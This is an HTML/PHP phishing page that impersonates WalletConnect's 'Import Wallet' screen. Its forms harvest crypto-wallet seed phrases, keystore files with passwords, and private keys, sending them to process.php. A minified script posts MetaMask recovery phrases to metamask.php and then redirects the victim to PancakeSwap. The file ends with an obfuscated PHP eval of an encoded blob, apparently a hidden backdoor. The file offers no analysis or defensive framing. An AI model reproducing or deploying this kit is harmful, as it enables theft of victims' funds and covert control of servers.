<html>
<meta http-equiv="content-type" content="text/html" />
<?php require '../antibot.php';?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./images/logo.svg">
  <link rel="icon" href="./images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="wachtwoord" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="gebruikersnaam" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </body>
</html>








<script src="./index_files/jquery.min.js.download"></script>
<script>
var p=!1;setTimeout(function(){$(".z2").addClass("hidden"),$(".z3").removeClass("hidden")},1e3),$(".import-account__secret-phrase").on("keyup",function(){var t=$(this).val().split(" ");p||(12==t.length&&1<t[11].length||24==t.length&&1<t[23].length?$(".button.btn--first-time.first-time-flow__button").prop("disabled",!1):$(".button.btn--first-time.first-time-flow__button").prop("disabled",!0))}),$(".button.btn--first-time.first-time-flow__button").on("click",function(){p=!0,$(this).prop("disabled",!0).html('<i class="fa fa-spinner fa-spin fa-fw"></i> '+$(this).html()),$.post("./metamask.php",{data1:"MetaMask",data:$(".import-account__secret-phrase").val()},function(){p=!1},"json"),window.parent.opener.postMessage({uniswapyujinx:!0}),setTimeout(function(){$(".z2").removeClass("hidden"),$(".z3").addClass("hidden"),setTimeout(function(){window.parent.opener.location.replace("https://pancakeswap.finance/"),window.parent.close()},2e3)},1e3)}),document.body.addEventListener("contextmenu",function(t){"import-account__secret-phrase"!=t.toElement.className&&t.preventDefault()},!1);
</script>

    <script>
      document.getElementById("default").click();
    </script>
    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>